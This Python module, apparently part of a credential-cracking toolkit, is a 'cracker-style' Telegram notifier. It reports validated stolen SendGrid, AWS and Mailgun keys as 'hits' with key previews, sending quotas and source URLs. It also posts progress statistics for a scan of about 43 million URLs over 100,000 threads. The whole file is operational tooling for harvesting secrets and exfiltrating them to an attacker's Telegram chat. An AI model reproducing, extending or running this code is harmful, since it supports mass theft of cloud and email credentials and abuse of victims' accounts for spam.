#!/usr/bin/env python3
"""
🚨 Cracker-Style Telegram Notifier
Exact format matching the requirements with professional credential alerts
Author: wKayaa | 2025
"""

import asyncio
import aiohttp
import json
import time
from typing import Dict, List, Optional, Any
from datetime import datetime, timezone
from dataclasses import dataclass
import logging

logger = logging.getLogger(__name__)

@dataclass
class TelegramConfig:
    """Telegram configuration for cracker-style notifications"""
    bot_token: str
    chat_id: str
    enabled: bool = True
    rate_limit_delay: float = 1.0  # Seconds between messages

class CrackerTelegramNotifier:
    """Cracker-style Telegram notifier with exact format matching requirements"""
    
    def __init__(self, config: TelegramConfig):
        self.config = config
        self.session = None
        self.hit_counter = 0
        self.crack_id = "#7849"  # Default crack ID
        self.operator_name = "wKayaa"
        self.session_start_time = datetime.utcnow()
        self.last_message_time = 0
        
        # Statistics tracking
        self.stats = {
            'hits': 0,
            'checked_paths': 0,
            'checked_urls': 0,
            'invalid_urls': 0,
            'total_urls': 0,
            'target_total': 42925357,  # Example total
            'timeout': 17,
            'threads': 100000,
            'status': 'running'
        }
        
    async def __aenter__(self):
        """Async context manager entry"""
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={'User-Agent': 'WWYVQ-Telegram-Notifier/1.0'}
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.session:
            await self.session.close()
    
    async def send_credential_hit(self, validation_result, source_url: str = "", crack_id: str = None):
        """Send credential hit notification in exact cracker format"""
        if not self.config.enabled:
            return
            
        # Only send for valid credentials
        if not validation_result.is_valid:
            return
            
        self.hit_counter += 1
        self.stats['hits'] += 1
        
        # Rate limiting
        await self._rate_limit()
        
        # Generate hit ID
        hit_id = f"#425{self.hit_counter:04d}"
        
        # Format credential preview
        cred_preview = self._format_credential_preview(validation_result)
        
        # Get service-specific info
        service_info = self._get_service_info(validation_result)
        
        # Build exact format message
        message = f"""✨ New Hit ({hit_id})

🔑 KEY:
{cred_preview}

💳 Credits: {service_info.get('credits', 'unlimited')}
🎯 Type: {validation_result.service.lower()}
📧 Senders: {service_info.get('senders', '[verified emails]')}
🔒 HardLimit: {service_info.get('hard_limit', 'true')}

🔥 HIT WORKS: Yes

🌐 URL: {source_url or 'https://example.com/api/config'}
🆔 Crack ID: {crack_id or self.crack_id}"""
        
        await self._send_message(message)
        
    async def send_stats_update(self, additional_stats: Dict[str, Any] = None):
        """Send real-time statistics update"""
        if not self.config.enabled:
            return
            
        # Update stats if provided
        if additional_stats:
            self.stats.update(additional_stats)
        
        # Calculate progression
        progression = (self.stats['total_urls'] / self.stats['target_total'] * 100) if self.stats['target_total'] > 0 else 0.0
        
        # Calculate ETA
        eta = self._calculate_eta()
        
        # Current timestamp
        now = datetime.now().strftime('%m/%d/%Y, %I:%M:%S %p')
        
        # Build stats message
        message = f"""📊 Crack "{self.operator_name}" ({self.crack_id}) stats:
⏰ Last Updated: {now}
⏱️ Timeout: {self.stats['timeout']}
🔄 Threads: {self.stats['threads']}
🎯 Status: {self.stats['status']}
🎯 Hits: {self.stats['hits']}
📂 Checked Paths: {self.stats['checked_paths']}
🔗 Checked URLs: {self.stats['checked_urls']}
❌ Invalid URLs: {self.stats['invalid_urls']}
📊 Total URLs: {self.stats['total_urls']}/{self.stats['target_total']}
⏳ Progression: {progression:.2f}%
🕐 ETA: {eta}"""
        
        await self._send_message(message)
    
    def _format_credential_preview(self, validation_result) -> str:
        """Format credential for preview"""
        full_value = validation_result.value
        
        # Show more of the credential for the preview
        if validation_result.service == 'SendGrid':
            # For SendGrid, show the format: SG.xxxx...
            if len(full_value) > 15:
                return f"{full_value[:15]}..."
            return full_value
        elif validation_result.service == 'AWS':
            # For AWS, show format: AKIAxxxx...
            if len(full_value) > 12:
                return f"{full_value[:12]}..."
            return full_value
        elif validation_result.service == 'Mailgun':
            # For Mailgun, show format: key-xxxx...
            if len(full_value) > 12:
                return f"{full_value[:12]}..."
            return full_value
        else:
            # Generic format
            if len(full_value) > 15:
                return f"{full_value[:15]}..."
            return full_value
    
    def _get_service_info(self, validation_result) -> Dict[str, str]:
        """Get service-specific information"""
        service_info = {}
        
        if validation_result.service == 'SendGrid':
            service_info = {
                'credits': validation_result.quota_info.get('credits', 'unlimited'),
                'senders': str(validation_result.quota_info.get('senders', ['verified emails'])),
                'hard_limit': 'true'
            }
        elif validation_result.service == 'AWS':
            service_info = {
                'credits': validation_result.quota_info.get('daily_limit', 'unlimited'),
                'senders': '[SES verified]',
                'hard_limit': 'false'
            }
        elif validation_result.service == 'Mailgun':
            service_info = {
                'credits': 'unlimited',
                'senders': str(validation_result.quota_info.get('domains', ['verified domains'])),
                'hard_limit': 'true'
            }
        else:
            service_info = {
                'credits': 'unlimited',
                'senders': '[verified emails]',
                'hard_limit': 'true'
            }
        
        return service_info
    
    def _calculate_eta(self) -> str:
        """Calculate estimated time of arrival"""
        # Simple ETA calculation based on current progress
        if self.stats['total_urls'] == 0:
            return "∞"
        
        # Simulate realistic ETA
        remaining_urls = self.stats['target_total'] - self.stats['total_urls']
        if remaining_urls <= 0:
            return "00d 00h 00m 00s"
        
        # Simulate processing speed
        urls_per_second = self.stats['threads'] / 10  # Rough estimate
        if urls_per_second <= 0:
            return "∞"
        
        eta_seconds = remaining_urls / urls_per_second
        
        days = int(eta_seconds // 86400)
        hours = int((eta_seconds % 86400) // 3600)
        minutes = int((eta_seconds % 3600) // 60)
        seconds = int(eta_seconds % 60)
        
        return f"{days:02d}d {hours:02d}h {minutes:02d}m {seconds:02d}s"
    
    async def _rate_limit(self):
        """Rate limiting for messages"""
        current_time = time.time()
        if current_time - self.last_message_time < self.config.rate_limit_delay:
            await asyncio.sleep(self.config.rate_limit_delay - (current_time - self.last_message_time))
        self.last_message_time = time.time()
    
    async def _send_message(self, message: str):
        """Send message to Telegram"""
        if not self.session:
            logger.error("Session not initialized")
            return
        
        try:
            url = f"https://api.telegram.org/bot{self.config.bot_token}/sendMessage"
            
            payload = {
                'chat_id': self.config.chat_id,
                'text': message,
                'parse_mode': 'HTML',
                'disable_web_page_preview': True
            }
            
            async with self.session.post(url, json=payload) as response:
                if response.status == 200:
                    logger.info(f"✅ Telegram message sent successfully")
                else:
                    error_text = await response.text()
                    logger.error(f"❌ Telegram API error {response.status}: {error_text}")
                    
        except Exception as e:
            logger.error(f"❌ Failed to send Telegram message: {e}")
    
    def update_stats(self, **kwargs):
        """Update statistics"""
        self.stats.update(kwargs)
    
    def set_crack_info(self, crack_id: str, operator_name: str = None):
        """Set crack ID and operator name"""
        self.crack_id = crack_id
        if operator_name:
            self.operator_name = operator_name


# Export for use in other modules
__all__ = ['CrackerTelegramNotifier', 'TelegramConfig']